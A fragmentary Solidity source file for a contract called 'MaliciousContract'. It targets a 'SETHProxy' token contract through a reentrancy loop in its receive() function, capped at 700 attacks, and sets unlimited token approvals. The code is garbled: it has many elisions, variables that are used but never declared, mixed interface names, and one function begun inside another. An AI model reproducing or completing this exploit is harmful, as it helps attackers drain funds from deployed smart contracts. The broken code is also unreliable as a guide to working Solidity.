...
interface SETHProxy {
    function upgrade(uint wad) external;
...
contract MaliciousContract {
    ...
    uint256 private constant MAX_ATTACK_COUNT = 700;
    address private _owner;
    address private wadTokenAddress;
      address private sethTokenAddress;
    uint256 private numAttacksToPerform;
    uint256 private attacksPerformed;
    uint256 private constant BATCH_SIZE = 10;

    constructor(SETHProxy _target, address _wadTokenAddress, address _sethTokenAddress) {
        target = _target;
          wadTokenAddress = _wadTokenAddress;
        sethTokenAddress = _sethTokenAddress;
        _owner = msg.sender;
            // Llamar a la función approve para permitir que el contrato target gaste tokens
        IERC20Token(wadTokenAddress).approve(address(target), uint256(-1));
         IERC20Token(sethTokenAddress).approve(address(target), uint256(-1));
    }
    ...
    receive() external payable {
        if (attackCount < MAX_ATTACK_COUNT) {
            ...
            if (IERC20(sethTokenAddress).allowance(address(this), address(target)) == 0) {
                IERC20(sethTokenAddress).approve(address(target), uint256(-1));
            }
    ...
    function approveAndCallTarget(uint256 amount) external onlyOwner {
        ...
        function approveAndCallTargetupgrade(uint256 amount) external onlyOwner {
